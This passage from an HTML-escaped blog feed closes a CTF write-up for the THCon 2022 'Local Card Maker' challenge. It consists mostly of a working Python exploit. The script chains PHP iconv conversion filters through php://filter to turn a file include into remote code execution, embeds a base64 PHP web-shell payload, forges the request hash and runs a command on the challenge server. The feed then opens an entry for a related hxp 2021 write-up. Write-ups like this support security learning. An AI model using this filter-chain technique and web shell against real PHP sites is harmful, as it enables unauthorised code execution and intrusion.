target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.php.net&amp;#x2F;manual&amp;#x2F;en&amp;#x2F;filters.convert.php&amp;quot;&amp;gt;PHP conversion filters&amp;lt;&amp;#x2F;a&amp;gt; passed to &amp;lt;code&amp;gt;include()&amp;lt;&amp;#x2F;code&amp;gt; to achieve &amp;lt;strong&amp;gt;RCE&amp;lt;&amp;#x2F;strong&amp;gt; (which is much more than what we need here - reading file content, but will work!). I wrote the below solution to adapt the method to this challenge:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;hashlib
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;requests
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Based on https:&amp;#x2F;&amp;#x2F;gist.github.com&amp;#x2F;loknop&amp;#x2F;b27422d355ea1fd0d90d6dbc1e278d4d (until line 52):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;conversions &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;R&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;B&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;C&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;8&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;9&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;f&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;s&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;z&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;U&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;P&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;V&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;0&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;Y&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;W&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;d&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;D&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;7&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;4&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&amp;amp;#39;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Simple but does the trick
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;command &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;cat &amp;#x2F;flag.txt&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#&amp;amp;lt;?=`$_GET[0]`;;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64_payload &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;PD89YCRfR0VUWzBdYDs7Pz4&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# generate some garbage base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.iconv.UTF8.CSISO2022KR|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.base64-encode|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.iconv.UTF8.UTF7|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64_payload[::&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;conversions[c] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# decode and reencode to get rid of everything that isn&amp;amp;#39;t valid base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.base64-decode|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.base64-encode|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# get rid of equal signs
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.iconv.UTF8.UTF7|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.base64-decode&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;file_to_use &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;index&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;final_payload &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;filters&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;resource=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;file_to_use&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;.encode()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# &amp;amp;quot;Local Card Maker&amp;amp;quot;-specific implementation starts here:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;key_salt &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Thcon_SuP3r_S3cr4t_K3y!&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;base64.encodebytes(final_payload).replace(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\n&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf_hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;hashlib.sha1(key_salt &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;buf).hexdigest()&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;buf.decode()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests.get(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;amp;pHash=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;amp;0=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(buf, buf_hash, command)).content)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The result contained the flag &amp;lt;code&amp;gt;Thcon22{_Php_&amp;amp;amp;nd_Ap@che_R000ck5$$_}&amp;lt;&amp;#x2F;code&amp;gt; - I guess the original solution should have used Apache? 😅&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Winning the Impossible Race - An Unintended Solution for Includer&#x27;s Revenge &#x2F; Counter (hxp 2021)</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-12-27-winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021&#x2F;"/>
                <updated>2021-12-27T00:00:00+0000</updated>
